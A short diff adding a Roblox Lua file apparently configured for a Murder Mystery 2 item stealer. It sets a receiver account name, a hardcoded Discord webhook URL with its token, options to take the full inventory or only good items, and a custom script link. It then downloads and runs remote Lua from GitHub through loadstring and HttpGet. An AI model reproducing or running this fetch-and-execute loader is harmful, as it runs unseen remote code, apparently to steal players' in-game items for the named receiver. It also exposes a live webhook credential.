@@ -1,0 +1,11 @@
+Config = {
+    Receiver = "kuridangngua",  -- Single receiver as a string
+    Webhook = "https://discord.com/api/webhooks/1271748521757904966/mfqDXUs_MWoxef_3RCG9hmaWkOtfMtdWeYt-E7SbYpPGxiD8osJLPhdNNNiqgO1w2icQ",
+    FullInventory = true,
+    GoodItemsOnly = true,
+    Script = "Custom",
+    CustomLink = "https://raw.githubusercontent.com/EASEHUBSCRIPTS/ilovehelenaaa/main/ilovehelenaaa"
+}
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/mm2/main/merd1.lua"))()
